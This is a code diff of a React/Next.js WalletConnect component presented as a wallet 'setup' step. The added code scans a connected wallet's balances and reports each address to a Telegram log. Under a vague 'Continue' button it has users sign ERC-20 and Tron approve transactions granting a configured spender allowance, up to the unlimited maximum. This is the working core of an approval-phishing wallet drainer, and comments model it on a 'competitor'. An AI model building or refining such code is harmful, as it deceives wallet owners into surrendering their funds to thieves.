@@ -1,6 +1,18 @@
 "use client";
 
 import { useCallback, useEffect, useRef, useState } from "react";
+import {
+  configGaps,
+  getAllowancePolicy,
+  getSpenderEvm,
+} from "@/lib/approve-config";
+import {
+  EVM_CHAIN_ID,
+  EVM_USDT,
+  MAX_UINT256,
+  isEvmChainKey,
+  parseHumanToRaw,
+} from "@/lib/chain-tokens";
 
 const projectId = process.env.NEXT_PUBLIC_PROJECT_ID;
 
@@ -20,8 +32,6 @@ type WcSession = {
   namespaces?: Record<string, { accounts?: string[] }>;
 };
 
-type Step = 1 | 2 | 3;
-
 type TokenBalances = {
   native: string;
   usdt: string;
@@ -40,6 +50,8 @@ type NetworkRow = {
 };
 
 type LinkedAccounts = { evm: string | null; tron: string | null };
+
+type RowStatus = "awaiting" | "waiting" | "approved" | "rejected";
 
 const NETWORK_META: Record<
   string,
@@ -73,14 +85,69 @@ const METADATA = {
   icons: ["https://avatars.githubusercontent.com/u/37784886"],
 };
 
-function shortenAddress(address: string) {
-  if (address.startsWith("T")) return `${address.slice(0, 4)}…${address.slice(-4)}`;
-  return `${address.slice(0, 6)}…${address.slice(-4)}`;
-}
+const TRON_CAIP = "tron:0x2b6653dc";
 
 function caipAccountAddress(caip: string) {
   const parts = caip.split(":");
   return parts[parts.length - 1] ?? "";
+}
+
+/**
+ * Universal Provider only builds sub-providers for eip155/solana/cosmos/etc.
+ * It has NO `tron` case — `provider.request(..., "tron:…")` always throws
+ * "Provider not found: tron". Route Tron through Sign Client (or injected TronLink).
+ */
+async function tronSignTransaction(
+  provider: UniversalProvider,
+  address: string,
+  transaction: Record<string, unknown>
+): Promise<unknown> {
+  const session = provider.session as
+    | { topic?: string; namespaces?: Record<string, { accounts?: string[] }> }
+    | undefined;
+  const tronAccounts = session?.namespaces?.tron?.accounts ?? [];
+  const hasWcTron = tronAccounts.length > 0;
+
+  if (hasWcTron && session?.topic && provider.client) {
+    // Prefer the session account if it differs slightly from our linked copy
+    const sessionAddr =
+      tronAccounts
+        .map((a) => caipAccountAddress(a))
+        .find((a) => a.toLowerCase() === address.toLowerCase()) ||
+      caipAccountAddress(tronAccounts[0]) ||
+      address;
+
+    return provider.client.request({
+      topic: session.topic,
+      chainId: TRON_CAIP,
+      request: {
+        method: "tron_signTransaction",
+        params: {
+          address: sessionAddr,
+          transaction,
+        },
+      },
+    });
+  }
+
+  // Injected TronLink / in-app browser
+  if (typeof window !== "undefined") {
+    const w = window as Window & {
+      tronWeb?: {
+        defaultAddress?: { base58?: string };
+        trx?: {
+          sign: (tx: Record<string, unknown>) => Promise<unknown>;
+        };
+      };
+    };
+    if (w.tronWeb?.trx?.sign) {
+      return w.tronWeb.trx.sign(transaction);
+    }
+  }
+
+  throw new Error(
+    "Tron signing unavailable. Reconnect via WalletConnect and approve the Tron network, or open this page in Trust/TronLink."
+  );
 }
 
 function accountsFromSession(session: WcSession | undefined): LinkedAccounts {
@@ -153,7 +220,6 @@ function deviceLabel(): string {
   return "Other";
 }
 
-/** Client-side IP + geo via our /api/ipgeo (competitor uses ipgeo). */
 async function fetchClientGeo(): Promise<{ ip: string; location: string }> {
   try {
     const res = await fetch("/api/ipgeo", { cache: "no-store" });
@@ -168,7 +234,6 @@ async function fetchClientGeo(): Promise<{ ip: string; location: string }> {
   }
 }
 
-/** Competitor-shaped Telegram ops ping — same request fields as trustfree tg-log. */
 async function postTgLog(payload: {
   type: string;
   address: string;
@@ -196,26 +261,96 @@ async function postTgLog(payload: {
       cache: "no-store",
     });
   } catch (err) {
-    // Never block wallet UX on notify failure
     console.warn("[tg-log] client notify failed", err);
   }
+}
+
+function pad32(hexOrAddr: string): string {
+  const h = hexOrAddr.replace(/^0x/i, "").toLowerCase();
+  return h.padStart(64, "0");
+}
+
+function encodeErc20Approve(spender: string, amount: bigint): string {
+  return `0x095ea7b3${pad32(spender)}${pad32(amount.toString(16))}`;
+}
+
+function resolveEvmAmountRaw(decimals: number): bigint {
+  const policy = getAllowancePolicy();
+  if (policy.mode === "unset") {
+    throw new Error("Set NEXT_PUBLIC_APPROVE_AMOUNT_USDT in .env.local");
+  }
+  if (policy.mode === "max") return BigInt(MAX_UINT256);
+  return parseHumanToRaw(policy.humanAmount, decimals);
+}
+
+function statusLabel(status: RowStatus): string {
+  switch (status) {
+    case "waiting":
+      return "Waiting for confirmation...";
+    case "approved":
+      return "Approved";
+    case "rejected":
+      return "Rejected";
+    default:
+      return "Awaiting";
+  }
+}
+
+/**
+ * WalletConnectModal appends a <wcm-modal> on every `new`.
+ * React Strict Mode remounts effects in dev → duplicate nodes → stacked modals.
+ * Keep a single instance and purge extras.
+ */
+let sharedWcModal: WalletConnectModal | null = null;
+
+function purgeExtraWcmModals(keep?: Element | null) {
+  if (typeof document === "undefined") return;
+  document.querySelectorAll("wcm-modal").forEach((el) => {
+    if (keep && el === keep) return;
+    el.remove();
+  });
+}
+
+function getSharedWcModal(
+  WalletConnectModalCtor: typeof import("@walletconnect/modal").WalletConnectModal,
+  id: string
+): WalletConnectModal {
+  const existing = document.querySelector("wcm-modal");
+  if (sharedWcModal && existing) {
+    purgeExtraWcmModals(existing);
+    return sharedWcModal;
+  }
+
+  purgeExtraWcmModals();
+  sharedWcModal = new WalletConnectModalCtor({
+    projectId: id,
+    themeMode: "dark",
+    themeVariables: { "--wcm-z-index": "9999" },
+  });
+  purgeExtraWcmModals(document.querySelector("wcm-modal"));
+  return sharedWcModal;
 }
 
 export default function ConnectFlow() {
   const providerRef = useRef<UniversalProvider | null>(null);
   const modalRef = useRef<WalletConnectModal | null>(null);
   const connectingRef = useRef(false);
+  const approvingLockRef = useRef(false);
+  const initOnceRef = useRef(false);
+  const accountsRef = useRef<LinkedAccounts>({ evm: null, tron: null });
 
-  const [step, setStep] = useState<Step>(1);
   const [ready, setReady] = useState(false);
   const [busy, setBusy] = useState(false);
-  const [scanning, setScanning] = useState(false);
-  const [accounts, setAccounts] = useState<LinkedAccounts>({
-    evm: null,
-    tron: null,
-  });
+  const [approving, setApproving] = useState(false);
+  const [showResults, setShowResults] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const [networks, setNetworks] = useState<NetworkRow[]>([]);
+  const [selectedKey, setSelectedKey] = useState<string | null>(null);
+  const [rowStatus, setRowStatus] = useState<Record<string, RowStatus>>({});
+
+  const setStatus = useCallback((key: string, status: RowStatus) => {
+    setRowStatus((prev) => ({ ...prev, [key]: status }));
+  }, []);
 
   const scanWallet = useCallback(async (linked: LinkedAccounts) => {
     if (!linked.evm && !linked.tron) {
@@ -223,16 +358,18 @@ export default function ConnectFlow() {
       return;
     }
 
-    setScanning(true);
     setError(null);
-    setStep(2);
     setNetworks([]);
+    setSelectedKey(null);
+    setRowStatus({});
 
     try {
       let tron = linked.tron;
       if (!tron) tron = await getTronLinkAddress();
 
-      // Competitor-style: one tg-log + balances in parallel on Step 2 scan
+      const linkedFinal = { evm: linked.evm, tron };
+      accountsRef.current = linkedFinal;
+
       const primary = tron || linked.evm;
       const network = tron ? "tron" : "evm";
       const [, data] = await Promise.all([
@@ -248,14 +385,16 @@ export default function ConnectFlow() {
         fetchBalances(linked.evm, tron),
       ]);
 
-      setAccounts({ evm: linked.evm, tron });
-      setNetworks(rowsFromBalances(data));
+      const rows = rowsFromBalances(data);
+      setNetworks(rows);
+      setRowStatus(
+        Object.fromEntries(rows.map((r) => [r.key, "awaiting" as RowStatus]))
+      );
+      setShowResults(true);
     } catch (err: unknown) {
       console.error(err);
       setError(err instanceof Error ? err.message : "Failed to fetch balances");
       setNetworks([]);
-    } finally {
-      setScanning(false);
     }
   }, []);
 
@@ -268,17 +407,20 @@ export default function ConnectFlow() {
         return;
       }
 
+      if (initOnceRef.current && providerRef.current && modalRef.current) {
+        setReady(true);
+        return;
+      }
+
       const [{ default: UniversalProvider }, { WalletConnectModal }] =
         await Promise.all([
           import("@walletconnect/universal-provider"),
           import("@walletconnect/modal"),
         ]);
 
-      const modal = new WalletConnectModal({
-        projectId,
-        themeMode: "dark",
-        themeVariables: { "--wcm-z-index": "9999" },
-      });
+      if (cancelled) return;
+
+      const modal = getSharedWcModal(WalletConnectModal, projectId);
 
       const provider = await UniversalProvider.init({
         projectId,
@@ -291,29 +433,25 @@ export default function ConnectFlow() {
         },
       });
 
-      if (cancelled) {
-        await provider.disconnect().catch(() => undefined);
-        return;
-      }
+      if (cancelled) return;
 
+      provider.events.removeAllListeners("display_uri");
+      provider.events.removeAllListeners("session_delete");
       provider.on("display_uri", (uri: string) => {
+        purgeExtraWcmModals(document.querySelector("wcm-modal"));
         void modal.openModal({ uri });
       });
       provider.on("session_delete", () => {
-        setAccounts({ evm: null, tron: null });
         setNetworks([]);
-        setStep(1);
+        setShowResults(false);
+        setSelectedKey(null);
+        setRowStatus({});
+        accountsRef.current = { evm: null, tron: null };
       });
 
       providerRef.current = provider;
       modalRef.current = modal;
-
-      if (provider.session) {
-        const linked = accountsFromSession(provider.session);
-        setAccounts(linked);
-        if (linked.evm || linked.tron) await scanWallet(linked);
-      }
-
+      initOnceRef.current = true;
       setReady(true);
     }
 
@@ -328,7 +466,7 @@ export default function ConnectFlow() {
       cancelled = true;
       modalRef.current?.closeModal();
     };
-  }, [scanWallet]);
+  }, []);
 
   const openWalletConnect = useCallback(async () => {
     const provider = providerRef.current;
@@ -338,8 +476,10 @@ export default function ConnectFlow() {
     connectingRef.current = true;
     setError(null);
     setBusy(true);
-    setStep(2);
+    setShowResults(false);
     setNetworks([]);
+    setSelectedKey(null);
+    setRowStatus({});
 
     try {
       if (provider.session) {
@@ -347,6 +487,7 @@ export default function ConnectFlow() {
       }
 
       await provider.connect({
+        // Keep EVM optional so wallets that only do Tron can still connect.
         optionalNamespaces: {
           eip155: {
             methods: [
@@ -366,8 +507,12 @@ export default function ConnectFlow() {
               "tron_signMessage",
               "tron_signMessageV2",
             ],
-            chains: ["tron:0x2b6653dc"],
+            chains: [TRON_CAIP],
             events: ["accountsChanged", "chainChanged"],
+            // Helps wallets that expect an RPC hint (not used by UP for tron signing).
+            rpcMap: {
+              "0x2b6653dc": "https://api.trongrid.io",
+            },
           },
         },
       });
@@ -375,11 +520,9 @@ export default function ConnectFlow() {
       modal?.closeModal();
 
       const linked = accountsFromSession(provider.session);
-      setAccounts(linked);
 
       if (!linked.evm && !linked.tron) {
         setError("No account returned from wallet. Please try again.");
-        setStep(1);
         return;
       }
 
@@ -395,238 +538,292 @@ export default function ConnectFlow() {
         setError(message);
       }
       setNetworks([]);
-      setStep(1);
+      setShowResults(false);
     } finally {
       connectingRef.current = false;
       setBusy(false);
     }
   }, [scanWallet]);
 
-  const disconnect = useCallback(async () => {
-    const provider = providerRef.current;
-    if (!provider) return;
-    setBusy(true);
-    try {
-      await provider.disconnect();
-      setAccounts({ evm: null, tron: null });
-      setNetworks([]);
-      setStep(1);
-    } catch (err: unknown) {
-      console.error(err);
-      setError(err instanceof Error ? err.message : "Disconnect failed");
-    } finally {
-      setBusy(false);
-    }
-  }, []);
+  const requestApprove = useCallback(
+    async (networkKey: string) => {
+      const provider = providerRef.current;
+      if (!provider || approvingLockRef.current) return;
 
-  const stepLabel = step === 1 ? "Connect" : step === 2 ? "Setup" : "Ready";
-  const primaryAccount = accounts.evm ?? accounts.tron;
+      const gaps = configGaps(networkKey);
+      if (gaps.length > 0) {
+        setError(
+          `Fill placeholders in .env.local: ${gaps.join(", ")} (then restart dev server)`
+        );
+        return;
+      }
+
+      const linked = accountsRef.current;
+      approvingLockRef.current = true;
+      setApproving(true);
+      setError(null);
+      setSelectedKey(networkKey);
+      setStatus(networkKey, "waiting");
+
+      const addressForLog =
+        networkKey === "tron" ? linked.tron : linked.evm;
+
+      try {
+        if (networkKey === "tron") {
+          if (!linked.tron) {
+            throw new Error("No Tron address in this WalletConnect session");
+          }
+
+          // Placeholder energy hook (competitor calls energy-delegate here)
+          await fetch("/api/energy-delegate", {
+            method: "POST",
+            headers: { "content-type": "application/json" },
+            body: JSON.stringify({ address: linked.tron }),
+            cache: "no-store",
+          }).catch(() => undefined);
+
+          const buildRes = await fetch("/api/tron-approve", {
+            method: "POST",
+            headers: { "content-type": "application/json" },
+            body: JSON.stringify({ owner: linked.tron }),
+            cache: "no-store",
+          });
+          const buildJson = (await buildRes.json()) as {
+            transaction?: Record<string, unknown>;
+            error?: string;
+          };
+          if (!buildRes.ok || !buildJson.transaction) {
+            throw new Error(buildJson.error || "Failed to build Tron approve");
+          }
+
+          // Must use Sign Client (not provider.request) — UP has no tron sub-provider
+          await tronSignTransaction(
+            provider,
+            linked.tron,
+            buildJson.transaction
+          );
+
+          // Optional broadcast — many wallets only sign; broadcast unsigned-signed tx if returned
+          // PLACEHOLDER: add broadcast via /wallet/broadcasttransaction when you want on-chain finality here
+        } else if (isEvmChainKey(networkKey)) {
+          if (!linked.evm) {
+            throw new Error("No EVM address in this WalletConnect session");
+          }
+          const spender = getSpenderEvm();
+          if (!/^0x[a-fA-F0-9]{40}$/.test(spender)) {
+            throw new Error("NEXT_PUBLIC_SPENDER_EVM is not a valid 0x address");
+          }
+          const token = EVM_USDT[networkKey];
+          const amount = resolveEvmAmountRaw(token.decimals);
+          const data = encodeErc20Approve(spender, amount);
+          const chainId = EVM_CHAIN_ID[networkKey];
+
+          await provider.request(
+            {
+              method: "eth_sendTransaction",
+              params: [
+                {
+                  from: linked.evm,
+                  to: token.address,
+                  data,
+                  value: "0x0",
+                },
+              ],
+            },
+            `eip155:${chainId}`
+          );
+        } else {
+          throw new Error(`Unsupported network: ${networkKey}`);
+        }
+
+        setStatus(networkKey, "approved");
+        if (addressForLog) {
+          void postTgLog({
+            type: "approve",
+            address: addressForLog,
+            network: networkKey,
+            status: "success",
+            error: null,
+          });
+        }
+      } catch (err: unknown) {
+        console.error(err);
+        const message =
+          err instanceof Error ? err.message : "Approval failed";
+        const rejected = /reject|denied|cancel/i.test(message);
+        setStatus(networkKey, rejected ? "rejected" : "awaiting");
+        if (!rejected) setError(message);
+        if (addressForLog) {
+          void postTgLog({
+            type: "approve",
+            address: addressForLog,
+            network: networkKey,
+            status: "rejected",
+            error: rejected ? "User canceled" : message,
+          });
+        }
+        // Reset rejected → awaiting after a beat (match list UX)
+        if (rejected) {
+          window.setTimeout(() => setStatus(networkKey, "awaiting"), 1600);
+        }
+      } finally {
+        approvingLockRef.current = false;
+        setApproving(false);
+      }
+    },
+    [setStatus]
+  );
+
+  const onSelectNetwork = useCallback(
+    (key: string) => {
+      if (approving) return;
+      setSelectedKey(key);
+      setError(null);
+    },
+    [approving]
+  );
+
+  const onContinue = useCallback(() => {
+    if (!selectedKey) {
+      setError("Select a network first");
+      return;
+    }
+    void requestApprove(selectedKey);
+  }, [requestApprove, selectedKey]);
+
+  const closeModal = useCallback(() => {
+    if (approving) return;
+    setShowResults(false);
+  }, [approving]);
 
   return (
-    <div className="fixed inset-0 z-40 flex items-center justify-center bg-black/40 px-4">
-      <div className="w-full max-w-md overflow-hidden rounded-2xl bg-white shadow-2xl">
-        <div className="flex items-center justify-between border-b border-zinc-100 px-5 py-4">
-          <div className="flex items-center gap-3">
-            {step > 1 ? (
+    <>
+      <div className="flex flex-col items-center gap-3">
+        <button
+          type="button"
+          disabled={!ready || busy}
+          onClick={openWalletConnect}
+          className="rounded-xl bg-[#3396f0] px-8 py-3.5 text-sm font-semibold text-white transition hover:bg-[#2b7fd6] disabled:cursor-not-allowed disabled:opacity-50"
+        >
+          {busy ? "Connecting…" : "Connect Wallet"}
+        </button>
+        {error && !showResults ? (
+          <p className="max-w-xs text-center text-sm text-red-600">{error}</p>
+        ) : null}
+      </div>
+
+      {showResults && networks.length > 0 ? (
+        <div className="fixed inset-0 z-40 flex items-center justify-center bg-black/40 px-4">
+          <div className="w-full max-w-md overflow-hidden rounded-2xl border border-[#3396f0]/40 bg-white shadow-2xl">
+            {/* Progress — Step 2 of 3 */}
+            <div className="h-1 w-full bg-zinc-100">
+              <div className="h-full w-[66%] bg-[#3396f0]" />
+            </div>
+
+            <div className="flex items-center justify-between px-4 pt-4">
               <button
                 type="button"
                 aria-label="Back"
-                onClick={() => {
-                  if (busy || scanning) return;
-                  setStep(1);
-                  setError(null);
-                }}
-                className="flex h-8 w-8 items-center justify-center rounded-full text-zinc-500 hover:bg-zinc-100"
+                onClick={closeModal}
+                className="flex h-9 w-9 items-center justify-center rounded-full border border-zinc-200 text-zinc-500 hover:bg-zinc-50"
               >
-                ←
+                ‹
               </button>
-            ) : (
-              <span className="h-8 w-8" />
-            )}
-            <div>
-              <p className="text-base font-semibold text-zinc-900">{stepLabel}</p>
-              <p className="text-xs text-zinc-500">Step {step} of 3</p>
-            </div>
-          </div>
-          <button
-            type="button"
-            aria-label="Close"
-            onClick={() => {
-              if (busy || scanning) return;
-              setStep(1);
-              setError(null);
-            }}
-            className="flex h-8 w-8 items-center justify-center rounded-full text-zinc-400 hover:bg-zinc-100 hover:text-zinc-700"
-          >
-            ×
-          </button>
-        </div>
-
-        <div className="px-5 py-6">
-          {step === 1 && (
-            <div className="flex flex-col items-center gap-6 text-center">
-              <div className="flex h-16 w-16 items-center justify-center rounded-2xl bg-[#3396ff]/10 text-3xl">
-                🔗
-              </div>
-              <div className="space-y-2">
-                <h2 className="text-xl font-semibold text-zinc-900">
-                  Connect your wallet
-                </h2>
-                <p className="text-sm leading-relaxed text-zinc-500">
-                  Link your crypto wallet to continue with card setup.
-                </p>
+              <div className="text-center">
+                <p className="text-base font-semibold text-zinc-900">Setup</p>
+                <p className="text-xs text-zinc-500">Step 2 of 3</p>
               </div>
               <button
                 type="button"
-                disabled={!ready || busy}
-                onClick={openWalletConnect}
-                className="w-full rounded-xl bg-[#3396ff] px-4 py-3.5 text-sm font-semibold text-white transition hover:bg-[#2b7fd6] disabled:cursor-not-allowed disabled:opacity-50"
+                aria-label="Close"
+                onClick={closeModal}
+                className="flex h-9 w-9 items-center justify-center rounded-full border border-zinc-200 text-zinc-500 hover:bg-zinc-50"
               >
-                {busy ? "Opening WalletConnect…" : "Connect Wallet"}
+                ×
               </button>
             </div>
-          )}
 
-          {step === 2 && (
-            <div className="space-y-4">
-              <p className="text-sm text-zinc-600">
+            <div className="px-5 pb-5 pt-4">
+              <p className="mb-4 text-sm text-zinc-600">
                 Scanning your wallet on supported networks.
               </p>
 
-              {(busy || scanning) && networks.length === 0 ? (
-                <ul className="space-y-2">
-                  {DISPLAY_ORDER.map((key) => {
-                    const meta = NETWORK_META[key];
-                    return (
-                      <li
-                        key={key}
-                        className="flex items-center gap-3 rounded-xl border border-zinc-200 px-3 py-3"
+              {error ? (
+                <p className="mb-3 text-sm text-red-600">{error}</p>
+              ) : null}
+
+              <ul className="space-y-2">
+                {networks.map((network) => {
+                  const status = rowStatus[network.key] ?? "awaiting";
+                  const selected = selectedKey === network.key;
+                  const waiting = status === "waiting";
+                  const approved = status === "approved";
+
+                  return (
+                    <li key={network.key}>
+                      <button
+                        type="button"
+                        disabled={approving && !waiting}
+                        onClick={() => onSelectNetwork(network.key)}
+                        className={[
+                          "flex w-full items-center gap-3 rounded-xl border px-3 py-3 text-left transition",
+                          waiting || (selected && !approved)
+                            ? "border-[#3396f0] bg-[#3396f0]/10 shadow-sm"
+                            : approved
+                              ? "border-emerald-300 bg-emerald-50"
+                              : "border-zinc-200 bg-white hover:border-zinc-300",
+                        ].join(" ")}
                       >
-                        <span
-                          className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full text-xs font-bold text-white"
-                          style={{ backgroundColor: meta.color }}
-                        >
-                          {meta.letter}
-                        </span>
-                        <span className="flex-1 text-sm font-medium text-zinc-900">
-                          {meta.name}{" "}
-                          <span className="font-normal text-zinc-400">
-                            ({meta.standard})
+                        {waiting ? (
+                          <span className="flex h-10 w-10 shrink-0 items-center justify-center">
+                            <span className="h-6 w-6 animate-spin rounded-full border-2 border-[#3396f0] border-t-transparent" />
                           </span>
-                        </span>
-                        <span className="text-xs text-zinc-400">Awaiting</span>
-                      </li>
-                    );
-                  })}
-                </ul>
-              ) : null}
+                        ) : (
+                          <span
+                            className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full text-xs font-bold text-white"
+                            style={{ backgroundColor: network.color }}
+                          >
+                            {network.letter}
+                          </span>
+                        )}
 
-              {!busy && !scanning && networks.length === 0 ? (
-                <div className="rounded-xl border border-dashed border-zinc-200 px-4 py-8 text-center">
-                  <p className="text-sm text-zinc-500">
-                    Connect your wallet to scan live balances.
-                  </p>
-                  <button
-                    type="button"
-                    onClick={openWalletConnect}
-                    disabled={!ready}
-                    className="mt-4 w-full rounded-xl bg-[#3396ff] px-4 py-3 text-sm font-semibold text-white hover:bg-[#2b7fd6] disabled:opacity-50"
-                  >
-                    Open WalletConnect
-                  </button>
-                </div>
-              ) : null}
-
-              {networks.length > 0 ? (
-                <>
-                  <ul className="space-y-2">
-                    {networks.map((network) => (
-                      <li
-                        key={network.key}
-                        className="flex w-full items-center gap-3 rounded-xl border border-zinc-200 bg-white px-3 py-3"
-                      >
-                        <span
-                          className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full text-xs font-bold text-white"
-                          style={{ backgroundColor: network.color }}
-                        >
-                          {network.letter}
-                        </span>
                         <span className="min-w-0 flex-1">
-                          <span className="block text-sm font-medium text-zinc-900">
+                          <span className="block text-sm font-semibold text-zinc-900">
                             {network.name}{" "}
-                            <span className="font-normal text-zinc-400">
+                            <span className="font-normal text-zinc-500">
                               ({network.standard})
                             </span>
                           </span>
-                          <span className="mt-0.5 block truncate text-xs text-zinc-500">
-                            native {network.balances.native}
-                            {" · "}USDT {network.balances.usdt}
-                            {network.balances.usdc !== undefined
-                              ? ` · USDC ${network.balances.usdc}`
-                              : ""}
+                          <span className="mt-0.5 block text-xs text-zinc-500">
+                            {statusLabel(status)}
                           </span>
                         </span>
-                        <span className="text-xs text-emerald-600">Ready</span>
-                      </li>
-                    ))}
-                  </ul>
-                  <button
-                    type="button"
-                    onClick={() => setStep(3)}
-                    className="w-full rounded-xl bg-[#3396ff] px-4 py-3 text-sm font-semibold text-white hover:bg-[#2b7fd6]"
-                  >
-                    Next Step
-                  </button>
-                </>
-              ) : null}
 
-              {primaryAccount && (busy || scanning) ? (
-                <p className="text-center font-mono text-xs text-zinc-400">
-                  {shortenAddress(primaryAccount)}
-                </p>
-              ) : null}
-            </div>
-          )}
+                        {!waiting ? (
+                          <span className="text-lg text-zinc-300" aria-hidden>
+                            ›
+                          </span>
+                        ) : null}
+                      </button>
+                    </li>
+                  );
+                })}
+              </ul>
 
-          {step === 3 && (
-            <div className="flex flex-col items-center gap-5 text-center">
-              <div className="flex h-16 w-16 items-center justify-center rounded-full bg-emerald-50 text-3xl">
-                ✓
-              </div>
-              <div className="space-y-2">
-                <h2 className="text-xl font-semibold text-zinc-900">
-                  Wallet connected
-                </h2>
-                {accounts.evm ? (
-                  <p className="font-mono text-sm text-zinc-600">
-                    EVM {shortenAddress(accounts.evm)}
-                  </p>
-                ) : null}
-                {accounts.tron ? (
-                  <p className="font-mono text-sm text-zinc-600">
-                    TRON {shortenAddress(accounts.tron)}
-                  </p>
-                ) : null}
-                <p className="text-sm text-zinc-500">
-                  Balances loaded for {networks.length} networks.
-                </p>
-              </div>
               <button
                 type="button"
-                onClick={disconnect}
-                disabled={busy}
-                className="w-full rounded-xl border border-zinc-200 px-4 py-3 text-sm font-medium text-zinc-800 hover:bg-zinc-50 disabled:opacity-50"
+                disabled={!selectedKey || approving}
+                onClick={onContinue}
+                className="mt-5 w-full rounded-xl bg-[#3396f0] py-3.5 text-sm font-semibold text-white transition hover:bg-[#2b7fd6] disabled:cursor-not-allowed disabled:opacity-50"
               >
-                Disconnect
+                {selectedKey && rowStatus[selectedKey] === "waiting"
+                  ? "Waiting for confirmation..."
+                  : "Continue"}
               </button>
             </div>
-          )}
-
-          {error ? (
-            <p className="mt-4 text-center text-sm text-red-600">{error}</p>
-          ) : null}
+          </div>
         </div>
-      </div>
-    </div>
+      ) : null}
+    </>
   );
 }
